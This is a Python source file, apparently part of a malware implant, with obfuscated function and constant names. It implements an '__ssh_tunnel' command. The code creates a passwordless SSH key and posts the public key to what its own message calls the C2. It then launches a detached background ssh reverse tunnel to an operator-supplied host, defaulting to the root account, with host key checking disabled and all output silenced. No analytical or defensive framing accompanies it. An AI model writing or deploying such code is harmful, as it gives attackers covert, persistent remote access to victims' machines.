import os
import subprocess
import time

K5 = "k0"
K6 = "9051"
K7 = "22"
K8 = 60


def _t0(u: str, a: str, spf, remote: str, tp: str = K6, sp: str = K7) -> str:
    remote = (remote or "").strip()
    if not remote:
        return "tunnel failed: no remote (use __ssh_tunnel user@host or __ssh_tunnel host)"
    if "@" not in remote:
        remote = f"root@{remote}"
    try:
        from .m4 import _x2
    except Exception:
        return "tunnel failed: no data dir"
    dd = _x2()
    kp = os.path.join(dd, K5)
    ke = os.path.isfile(kp) and os.path.isfile(kp + ".pub")
    if not ke:
        ok, err = _t1(kp)
        if not ok:
            return f"tunnel failed: keygen {err}"
        try:
            with open(kp + ".pub", "r", encoding="utf-8", errors="ignore") as f:
                pk = f.read().strip()
        except Exception as e:
            return f"tunnel failed: read pubkey {e}"
        spf(u, a, pk)
        time.sleep(K8)
    cmd = [
        "ssh",
        "-p", sp,
        "-R", f"127.0.0.1:{tp}",
        remote,
        "-i", kp,
        "-N",
        "-o", "StrictHostKeyChecking=no",
        "-o", f"UserKnownHostsFile={os.devnull}",
    ]
    try:
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except FileNotFoundError:
        return "tunnel failed: ssh not found"
    except Exception as e:
        return f"tunnel failed: {e}"
    if ke:
        return "ssh_tunnel started (existing key)"
    return "ssh_tunnel started (new key posted to C2, waited 60s)"


def _t1(kp: str) -> tuple[bool, str]:
    try:
        r = subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", kp, "-N", ""],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if r.returncode != 0:
            return False, (r.stderr or r.stdout or "keygen failed").strip()[:200]
        return True, ""
    except FileNotFoundError:
        return False, "ssh-keygen not found"
    except subprocess.TimeoutExpired:
        return False, "keygen timeout"
    except Exception as e:
        return False, str(e)
